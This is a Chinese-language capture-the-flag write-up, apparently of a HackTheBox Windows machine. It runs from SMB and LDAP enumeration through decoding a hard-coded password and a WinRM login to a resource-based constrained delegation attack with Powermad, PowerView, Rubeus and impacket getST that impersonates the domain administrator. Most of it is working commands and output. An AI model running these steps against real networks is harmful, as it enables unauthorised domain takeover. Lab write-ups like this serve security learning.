nmap扫描结果

![](https://img.mi3aka.eu.org/2022/08/acead9ca9c5935a6d3bab8a05ad5203d.png)

goby扫描结果

![](https://img.mi3aka.eu.org/2022/08/51fe2b46ae2ca57afcb87f4b45dcb5a1.png)

---

1. LDAP NULL bind匿名绑定导致登录绕过漏洞

```python
import ldap
ldapconn = ldap.initialize('ldap://10.10.11.174:389')
ldapconn.simple_bind_s('', '')
print("hello")
```

![](https://img.mi3aka.eu.org/2022/08/b341faf6958276b3c3fc7dbaa6c27387.png)

2. smb未授权访问

`smbclient -N -L 10.10.11.174`

![](https://img.mi3aka.eu.org/2022/08/06a4a0fe9ea422fe1405aab994e05e6d.png)

![](https://img.mi3aka.eu.org/2022/08/a2d13d92997550e4874bf380d230f028.png)

![](https://img.mi3aka.eu.org/2022/08/07be57dae4c8fde4581387e006811f08.png)

只有`//10.10.11.174/support-tools`可以访问

![](https://img.mi3aka.eu.org/2022/08/c2da5b7ff66e1f8f36576669887be840.png)

![](https://img.mi3aka.eu.org/2022/08/b1bd2efd7085c2d1b6f036fe17d84ed4.png)

用`dnspy`进行逆向

![](https://img.mi3aka.eu.org/2022/08/4d7a37e9b026c97494c01ce6eb2fb467.png)

```cs
// UserInfo.Services.Protected
// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
public static string getPassword()
{
	byte[] array = Convert.FromBase64String(Protected.enc_password);
	byte[] array2 = array;
	for (int i = 0; i < array.Length; i++)
	{
		array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
	}
	return Encoding.Default.GetString(array2);
}


// UserInfo.Services.Protected
// Token: 0x06000011 RID: 17 RVA: 0x00002170 File Offset: 0x00000370
// Note: this type is marked as 'beforefieldinit'.
static Protected()
{
	Protected.enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
	Protected.key = Encoding.ASCII.GetBytes("armando");
}
```

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = "armando"


b64_password=base64.b64decode(enc_password)
password=""

for i in range(len(b64_password)):
    password+=chr((b64_password[i]^ord(key[i%len(key)]))^223)
print(password)
```

得到`nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

![](https://img.mi3aka.eu.org/2022/08/62e5e9d998b15c419e5e6f520c385e03.png)

作为ldap的密码试了这5个好像都不对???

---

重新看了一下dnspy,发现了一个`ladpquery`

```cs
public LdapQuery()
{
	string password = Protected.getPassword();
	this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
	this.entry.AuthenticationType = AuthenticationTypes.Secure;
	this.ds = new DirectorySearcher(this.entry);
}
```

去[https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/](https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/)学了一下怎样用ldapsearch进行搜索

`ldapsearch -H LDAP://support.htb -D support\\ldap -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"`

![](https://img.mi3aka.eu.org/2022/08/5a183d987b5d61353283b535e0e95215.png)

![](https://img.mi3aka.eu.org/2022/08/bbee4814558c305f2734c4252f529233.png)

1. 列出所有用户名

`ldapsearch -H LDAP://support.htb -D support\\ldap -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=support,DC=htb" "name=*" | grep "name:"`

```
name: Users
name: krbtgt
name: Domain Computers
name: Domain Controllers
name: Schema Admins
name: Enterprise Admins
name: Cert Publishers
name: Domain Admins
name: Domain Users
name: Domain Guests
name: Group Policy Creator Owners
name: RAS and IAS Servers
name: Allowed RODC Password Replication Group
name: Denied RODC Password Replication Group
name: Read-only Domain Controllers
name: Enterprise Read-only Domain Controllers
name: Cloneable Domain Controllers
name: Protected Users
name: Key Admins
name: Enterprise Key Admins
name: DnsAdmins
name: DnsUpdateProxy
name: Shared Support Accounts
name: ldap
name: support
name: smith.rosario
name: hernandez.stanley
name: wilson.shelby
name: anderson.damian
name: thomas.raphael
name: levine.leopoldo
name: raven.clifton
name: bardot.mary
name: cromwell.gerard
name: monroe.david
name: west.laura
name: langley.lucy
name: daughtler.mabel
name: stoll.rachelle
name: ford.victoria
name: Administrator
name: Guest
```

2. 发现在`name=support`时会多出一个`info`项

![](https://img.mi3aka.eu.org/2022/08/6f8fd6d890e5cd270fbb250fd885eb4f.png)

`Ironside47pleasure40Watchful`

3. goby显示`5985`端口上存在`http`服务,推测为winrm,尝试进行攻击

一开始用`pywinrm`去调用发现抛出`winrm.exceptions.InvalidCredentialsError`错误...

用[https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)进行攻击

>建议用Docker版

`./evil-winrm.rb -i 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'`

![](https://img.mi3aka.eu.org/2022/08/37fec9d0cc5a845dff52b2c6f7f2eb1c.png)

---

CS上个线

![](https://img.mi3aka.eu.org/2022/08/ae51322ea25d173ea737668a4ed64167.png)

~提权暂时没有思路...~

>Kerberos委派攻击

[https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)

[https://xz.aliyun.com/t/7217](https://xz.aliyun.com/t/7217)

>如果您对该计算机的 AD 对象具有 WRITE 权限，则可以在远程计算机上以提升的权限获得代码执行。

域控制器名称`dc.support.htb`

加载`PowerView.ps1`,在`LSTAR/scripts/InfoCollect`里面

![](https://img.mi3aka.eu.org/2022/08/2810528b74bd2a250bcbae6e9583a850.png)

加载[Powermad.ps1](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1)

```
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
Get-DomainComputer FAKE01
```

![](https://img.mi3aka.eu.org/2022/08/06bd34f8941418ffb2ce065d0b8cc1d8.png)

```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5101)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

![](https://img.mi3aka.eu.org/2022/08/c524ea6b3abd879413cce448b39e7b60.png)

从[https://github.com/r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)获取`Rubeus.exe`

`.\Rubeus.exe hash /password:123456 /user:FAKE01 /domain:offense.local`

```
[*] Input password             : 123456
[*] Input username             : FAKE01
[*] Input domain               : offense.local
[*] Salt                       : OFFENSE.LOCALFAKE01
[*]       rc4_hmac             : 32ED87BDB5FDC5E9CBA88547376818D4
[*]       aes128_cts_hmac_sha1 : 3D33480EFAE7A9D3CEFCF2809D6B1721
[*]       aes256_cts_hmac_sha1 : C3178E04A2D3587512B72838F32FABC7735FE78B7AC0CCC3787E78F614024451
[*]       des_cbc_md5          : FDF1D320C28C750E
```

![](https://img.mi3aka.eu.org/2022/08/bfc6c6ff7e845e946b12b0c74118ab24.png)

但是在`.\Rubeus.exe s4u /user:FAKE01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:spotless /msdsspn:cifs/dc.offense.local /ptt`这一步卡住了...

![](https://img.mi3aka.eu.org/2022/08/8dfb3a35487783337987e17609a82c86.png)

---

用[impacket/examples](https://github.com/SecureAuthCorp/impacket/tree/master/examples)中的`getST.py`

`python3 getST.py support.htb/FAKE01:123456 -dc-ip 10.10.11.174 -impersonate administrator -spn www/dc.support.htb`

![](https://img.mi3aka.eu.org/2022/08/006be78d9ec0dfd0eac39a8a28f91f62.png)

[https://xz.aliyun.com/t/8665#toc-5](https://xz.aliyun.com/t/8665#toc-5)

使用获取到的`ccache`

![](https://img.mi3aka.eu.org/2022/08/8870bc274dd45bafef3a57fac53d6687.png)

![](https://img.mi3aka.eu.org/2022/08/4b85f95f473dbcd842aac660ee68abb6.png)

---

>捋下思路

1. 通过nmap和goby发现开放`445`和`5985`端口

2. 通过smbclient读取到一个压缩包,对其中的`userinfo.exe`进行逆向,得到一个ldap的密码

3. 利用该密码进行`ldapsearch`,列出`CN=Users,DC=support,DC=htb`并进行分析,在`name=support`时得到一个`info`

4. 利用得到的`info`作为密码成功登入`winrm`

5. 进行约束委派,在域中创建一个新的对象,并更新属性`msDS-AllowedToActOnBehalfOfOtherIdentity`,使其能够冒充域用户(包括管理员)

6. 用`impacket`系列的`getST`请求`administrator`的`TGT`得到`administrator.ccache`,并利用该`ccache`冒充管理员成功利用`wimexec`登录系统